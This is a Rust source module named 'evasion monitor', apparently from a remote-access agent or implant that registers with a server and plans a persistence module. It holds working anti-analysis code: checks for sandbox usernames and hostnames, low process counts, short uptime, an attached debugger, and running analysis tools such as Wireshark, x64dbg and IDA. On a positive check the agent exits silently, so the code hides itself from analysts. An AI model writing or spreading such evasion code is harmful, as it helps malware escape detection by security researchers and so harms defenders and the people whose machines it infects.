//! Evasion monitor — pre-flight and in-loop checks.
//!
//! abort_if_sandboxed() runs once at startup. should_abort() runs every loop iteration.
//! Both return true if the agent should silently exit without doing anything.

const NO_EVASION: bool = {
    let b = env!("DM_NO_EVASION").as_bytes();
    b.len() == 4 && b[0] == b't' && b[1] == b'r' && b[2] == b'u' && b[3] == b'e'
};

/// abort_if_sandboxed runs before registration.
/// Returns true if the environment looks like a sandbox or analysis VM.
pub fn abort_if_sandboxed() -> bool {
    if NO_EVASION { return false; }
    #[cfg(target_os = "windows")]
    {
        if is_sandbox_artifact_present() { return true; }
        if is_suspicious_process_count() { return true; }
        if is_uptime_too_short()         { return true; }
    }
    false
}

/// should_abort runs every poll loop iteration.
/// Returns true if the environment changed in a way that suggests detection.
pub fn should_abort() -> bool {
    if NO_EVASION { return false; }
    #[cfg(target_os = "windows")]
    {
        if is_debugger_present()      { return true; }
        if is_analysis_tool_running() { return true; }
    }
    false
}

/// cleanup removes any artifacts left by the agent before exiting.
/// Called when the server sends a kill signal.
pub fn cleanup() {
    // Phase 1: nothing to clean up (no persistence installed by default)
    // Phase 3: uninstall persistence module if it was installed
}

// ---------------------------------------------------------------------------
// Windows-specific checks
// ---------------------------------------------------------------------------

#[cfg(target_os = "windows")]
fn is_debugger_present() -> bool {
    use windows_sys::Win32::System::Diagnostics::Debug::IsDebuggerPresent;
    unsafe { IsDebuggerPresent() != 0 }
}

#[cfg(target_os = "windows")]
fn is_sandbox_artifact_present() -> bool {
    // Check for common sandbox artifacts:
    // - Known sandbox usernames
    // - Known sandbox hostnames
    // - Sandbox driver files
    let username = std::env::var("USERNAME").unwrap_or_default().to_lowercase();
    let sandbox_users = ["sandbox", "analyst", "maltest", "test", "virus", "av", "malware"];
    if sandbox_users.iter().any(|u| username.contains(u)) {
        return true;
    }

    let hostname = std::env::var("COMPUTERNAME").unwrap_or_default().to_lowercase();
    let sandbox_hosts = ["sandbox", "analysis", "virus", "malware", "cuckoo"];
    if sandbox_hosts.iter().any(|h| hostname.contains(h)) {
        return true;
    }

    false
}

#[cfg(target_os = "windows")]
pub(crate) fn enum_process_names() -> Vec<String> {
    use windows_sys::Win32::Foundation::{CloseHandle, INVALID_HANDLE_VALUE};
    use windows_sys::Win32::System::Diagnostics::ToolHelp::{
        CreateToolhelp32Snapshot, Process32FirstW, Process32NextW, PROCESSENTRY32W,
        TH32CS_SNAPPROCESS,
    };
    let mut names = Vec::new();
    unsafe {
        let snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if snap == INVALID_HANDLE_VALUE {
            return names;
        }
        let mut entry: PROCESSENTRY32W = std::mem::zeroed();
        entry.dwSize = std::mem::size_of::<PROCESSENTRY32W>() as u32;
        if Process32FirstW(snap, &mut entry) != 0 {
            loop {
                let len = entry.szExeFile.iter().position(|&c| c == 0).unwrap_or(260);
                names.push(String::from_utf16_lossy(&entry.szExeFile[..len]).to_lowercase());
                if Process32NextW(snap, &mut entry) == 0 {
                    break;
                }
            }
        }
        CloseHandle(snap);
    }
    names
}

#[cfg(target_os = "windows")]
fn is_suspicious_process_count() -> bool {
    enum_process_names().len() < 30
}

#[cfg(target_os = "windows")]
fn is_uptime_too_short() -> bool {
    // Sandboxes are often freshly booted; uptime < 5 min is suspicious
    use windows_sys::Win32::System::SystemInformation::GetTickCount64;
    let uptime_ms = unsafe { GetTickCount64() };
    uptime_ms < 5 * 60 * 1000
}

#[cfg(target_os = "windows")]
fn is_analysis_tool_running() -> bool {
    const TOOLS: &[&str] = &[
        "wireshark.exe", "procmon.exe", "procmon64.exe",
        "processhacker.exe", "x64dbg.exe", "x32dbg.exe", "ollydbg.exe",
        "ida.exe", "ida64.exe", "idag.exe", "idat.exe",
        "autoruns.exe", "autoruns64.exe",
        "fiddler.exe", "burpsuite.exe",
        "dnspy.exe", "dotpeek64.exe",
    ];
    enum_process_names().iter().any(|n| TOOLS.contains(&n.as_str()))
}
